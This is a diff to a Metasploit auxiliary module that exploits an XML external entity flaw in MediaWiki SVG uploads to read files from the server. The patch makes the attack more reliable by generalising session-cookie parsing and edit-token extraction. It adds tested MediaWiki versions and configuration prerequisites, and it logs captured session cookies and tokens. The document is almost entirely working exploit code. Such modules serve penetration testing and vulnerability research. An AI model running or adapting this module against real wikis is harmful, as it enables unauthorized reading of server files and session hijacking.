@@ -22,7 +22,11 @@ class Metasploit4 < Msf::Auxiliary
 				expand external entities with the SYSTEM identifier. In order to work MediaWiki must
 				be configured to accept upload of SVG files. If anonymous uploads are allowed the
 				username and password aren't required, otherwise they are. This module has been
-				tested successfully on MediaWiki 1.19.4 and Ubuntu 10.04.
+				tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.
+				Older versions were also tested but do not seem to be vulnerable to this vulnerability.
+				The following MediaWiki requirements must be met: File upload must be enabled,
+				$wgFileExtensions[] must include 'svg', $wgSVGConverter must be set to something
+				other than 'false'.
 			},
 			'References'   =>
 				[
@@ -32,8 +36,9 @@ class Metasploit4 < Msf::Auxiliary
 				],
 			'Author'       =>
 				[
-					'Daniel Franke', # Vulnerability discovery and PoC
-					'juan vazquez'   # Metasploit module
+					'Daniel Franke',       # Vulnerability discovery and PoC
+					'juan vazquez',        # Metasploit module
+					'Christian Mehlmauer'  # Metasploit module
 				],
 			'License'      => MSF_LICENSE
 		)
@@ -69,8 +74,8 @@ class Metasploit4 < Msf::Auxiliary
 			}
 		})
 
-		if res and res.code == 200 and res.headers['Set-Cookie'] and res.headers['Set-Cookie'] =~ /my_wiki_session=([a-f0-9]*)/
-			return $1
+		if res and res.code == 200 and res.headers['Set-Cookie'] and res.headers['Set-Cookie'] =~ /([^\s]*session)=([a-z0-9]+)/
+			return $1,$2
 		else
 			return nil
 		end
@@ -84,7 +89,7 @@ class Metasploit4 < Msf::Auxiliary
 				"title"    => "Special:UserLogin",
 				"returnto" => "Main+Page"
 			},
-			'cookie' => "my_wiki_session=#{@first_session}"
+			'cookie' => session_cookie
 		})
 
 		if res and res.code == 200 and res.body =~ /name="wpLoginToken" value="([a-f0-9]*)"/
@@ -98,12 +103,14 @@ class Metasploit4 < Msf::Auxiliary
 	def parse_auth_cookie(cookies)
 		cookies.split(";").each do |part|
 			case part
-				when /my_wikiUserID=(.*)/
-					@wiki_user_id = $1
-				when /my_wikiUserName=(.*)/
-					@my_wiki_user_name = $1
-				when /my_wiki_session=(.*)/
-					@my_wiki_session = $1
+				when /([^\s]*UserID)=(.*)/
+					@wiki_user_id_name = $1
+					@wiki_user_id = $2
+				when /([^\s]*UserName)=(.*)/
+					@wiki_user_name_name = $1
+					@wiki_user_name = $2
+				when /session=(.*)/
+					@wiki_session = $1
 				else
 					next
 			end
@@ -112,9 +119,9 @@ class Metasploit4 < Msf::Auxiliary
 
 	def session_cookie
 		if @user and @password
-			return "my_wiki_session=#{@my_wiki_session}; my_wikiUserID=#{@wiki_user_id}; my_wikiUserName=#{@my_wiki_user_name}"
+			return "#{@wiki_session_name}=#{@wiki_session}; #{@wiki_user_id_name}=#{@wiki_user_id}; #{@wiki_user_name_name}=#{@wiki_user_name}"
 		else
-			return "my_wiki_session=#{@first_session}"
+			return "#{@wiki_session_name}=#{@wiki_session}"
 		end
 	end
 
@@ -134,10 +141,10 @@ class Metasploit4 < Msf::Auxiliary
 				"wpLoginToken"   => @login_token,
 				"returnto"       => "Main+Page"
 			},
-			'cookie' => "my_wiki_session=#{@first_session}"
+			'cookie' => session_cookie
 		})
 
-		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /my_wikiUserID/
+		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /UserID=/
 			parse_auth_cookie(res.headers['Set-Cookie'])
 			return true
 		else
@@ -152,7 +159,7 @@ class Metasploit4 < Msf::Auxiliary
 			'cookie' => session_cookie
 		})
 
-		if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /"editToken":"([0-9a-f]*)\+\\\\/
+		if res and res.code == 200 and res.body =~/<title>Upload file/ and res.body =~ /<input id="wpEditToken" type="hidden" value="([0-9a-f]*)\+\\" name="wpEditToken" \/>/
 			return $1
 		else
 			return nil
@@ -161,7 +168,6 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def upload_file
-
 		entity = Rex::Text.rand_text_alpha_lower(3)
 		@file_name = Rex::Text.rand_text_alpha_lower(4)
 		svg_file = %Q|
@@ -198,6 +204,13 @@ class Metasploit4 < Msf::Auxiliary
 		if res and res.code == 302 and res.headers['Location']
 			return res.headers['Location']
 		else
+			# try to output the errormessage
+			if res and res.body
+				error = res.body.scan(/<div class="error">(.*?)<\/div>/m)[0]
+				if error and error.size == 1
+					vprint_error(error[0])
+				end
+			end
 			return nil
 		end
 	end
@@ -217,13 +230,13 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def accessfile(rhost)
-
 		vprint_status("#{peer(rhost)} MediaWiki - Getting unauthenticated session...")
-		@first_session = get_first_session
-		if @first_session.nil?
+		@wiki_session_name, @wiki_session = get_first_session
+		if @wiki_session.nil?
 			print_error("#{peer(rhost)} MediaWiki - Failed to get unauthenticated session...")
 			return
 		end
+		vprint_status("#{peer(rhost)} Sessioncookie: #{@wiki_session_name}=#{@wiki_session}")
 
 		if @user and not @user.empty? and @password and not @password.empty?
 			vprint_status("#{peer(rhost)} MediaWiki - Getting login token...")
@@ -232,11 +245,15 @@ class Metasploit4 < Msf::Auxiliary
 				print_error("#{peer(rhost)} MediaWiki - Failed to get login token")
 				return
 			end
+			vprint_status("#{peer(rhost)} Logintoken: #{@login_token}")
 
 			if not authenticate
 				print_error("#{peer(rhost)} MediaWiki - Failed to authenticate")
 				return
 			end
+			vprint_status("#{peer(rhost)} Userid cookie: #{@wiki_user_id_name}=#{@wiki_user_id}")
+			vprint_status("#{peer(rhost)} Username cookie: #{@wiki_user_name_name}=#{@wiki_user_name}")
+			vprint_status("#{peer(rhost)} Session cookie: #{@wiki_session_name}=#{@wiki_session}")
 		end
 
 		vprint_status("#{peer(rhost)} MediaWiki - Getting edit token...")
@@ -245,6 +262,7 @@ class Metasploit4 < Msf::Auxiliary
 			print_error("#{peer(rhost)} MediaWiki - Failed to get edit token")
 			return
 		end
+		vprint_status("#{peer(rhost)} Edittoken: #{@edit_token}")
 
 		vprint_status("#{peer(rhost)} MediaWiki - Uploading SVG file...")
 		@svg_uri = upload_file
@@ -252,6 +270,7 @@ class Metasploit4 < Msf::Auxiliary
 			print_error("#{peer(rhost)} MediaWiki - Failed to upload SVG file")
 			return
 		end
+		vprint_status("#{peer(rhost)} SVG URI: #{@svg_uri}")
 
 		vprint_status("#{peer(rhost)} MediaWiki - Retrieving remote file...")
 		loot = read_data
@@ -276,4 +295,3 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 end
-
